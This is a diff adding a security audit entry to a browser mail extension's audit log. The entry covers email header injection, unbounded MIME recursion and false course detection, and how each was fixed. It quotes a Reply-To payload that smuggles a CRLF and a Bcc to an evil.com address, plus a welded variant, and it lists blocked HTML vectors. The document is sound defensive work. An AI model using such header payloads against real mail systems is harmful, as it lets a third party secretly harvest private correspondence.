@@ -79,3 +79,52 @@ apart again.
 `formaction`, `<base>`, `<meta refresh>`) all blocked. Store indices consistent
 across remove and recategorise. Every built-in view is a valid rule condition
 and names only categories that exist.
+
+
+## Audit 19 — background, MIME and classifier
+
+Continued the per-file pass into the layers audit 18 did not reach: the service
+worker, the MIME builder and parser, the classifier, and course detection.
+
+| # | File | Bug | Severity |
+|---|---|---|---|
+| 7 | `gmail.js` | **Email header injection** in To/Cc/Bcc/From/In-Reply-To/References | **critical** |
+| 8 | `mime.js` | Unbounded recursion — a crafted message killed the service worker | **serious** |
+| 9 | `timetable-mail.js` | Course detection fired on `AI 202`, `ISBN 978` | moderate |
+
+**Bug 7 is the most serious defect found in this project.** `safeHeaderValue`
+and `safeFilename` existed and were applied to *attachment metadata only*.
+Every address header was interpolated raw.
+
+The reachable attack is not "the user types CRLF into their own message". It is
+that `buildReply()` fills `To` from the **inbound** `Reply-To` header, which the
+sender controls completely. A message carrying
+
+```
+Reply-To: prof@bits.ac.in\r\nBcc: harvest@evil.com
+```
+
+meant that pressing Reply — an action with no warning attached — silently
+copied the reply to a third party. Verified end to end before fixing.
+
+Two weaker fixes were tried and rejected by testing, which is why the final one
+rebuilds address headers from validated tokens rather than patching the string:
+deleting the break welds the payload onto the address (`a@b.comBcc: x@evil.com`),
+and replacing it with a space leaves the attacker's address on the `To` line
+where a lenient parser may honour it.
+
+**Three of my own fixes were wrong and were caught before commit** — a pattern
+worth recording as much as the bugs:
+
+- A 200-char then 2000-char cap on address headers **dropped 12 recipients from
+  a 60-person reply-all**. Length was never the attack.
+- A 500-part breadth cap in `walk()` was unearned: measurement showed a
+  million-part tree walks in 92ms, while the cap would silently drop
+  attachments from a legitimate 600-part message. Removed.
+- I claimed department ordering was load-bearing (BIOT before BIO). Sabotage
+  proved it is not — the mandatory letter-plus-digits makes shadowing
+  impossible. The source comment, the tool check and the test were all
+  corrected rather than left asserting a false hazard.
+
+**Disproved:** `classify(null)` throws, but is unreachable — `toMessage()`
+normalises every field before the classifier sees it. No defensive code added.
